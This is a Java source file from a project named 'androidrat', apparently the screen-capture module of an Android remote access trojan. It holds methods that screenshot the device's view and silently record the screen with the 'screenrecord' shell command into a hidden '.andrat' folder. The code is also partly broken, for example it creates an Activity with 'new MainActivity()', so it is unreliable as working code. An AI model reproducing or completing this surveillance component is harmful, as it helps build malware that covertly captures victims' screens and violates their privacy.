package com.ot.androidrat;

import android.graphics.Bitmap;
import android.os.Environment;
import android.util.Log;
import android.view.View;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.time.LocalDateTime;

public class ScreenCapture {

    public void screencap(){
        try {
            String mPath = Environment.getExternalStorageDirectory().toString() + "/DCIM/" + System.currentTimeMillis() + ".jpg";
            Log.i("directory", mPath);
            // create bitmap screen capture
            View v1 = new MainActivity().getWindow().getDecorView().getRootView();
            v1.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
            v1.setDrawingCacheEnabled(false);

            File imageFile = new File(mPath);

            FileOutputStream outputStream = new FileOutputStream(imageFile);
            int quality = 100;
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
            outputStream.flush();
            outputStream.close();

        } catch (Throwable e) {
            // Several error may come out with file handling or DOM
            Log.i("directory", e.getMessage());
        }

    }

    public void screenRecord(){
        try{
            String curTime = null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                curTime = LocalDateTime.now().toString();
            }
            Process su = Runtime.getRuntime().exec("screenrecord --size \"1280x720\" --time-limit 20 /storage/emulated/0/.andrat/" + curTime +".mp4");
        }catch (IOException ioException){
            Log.i("ScreenRecord", "SMH out rn");
        }
    }


}
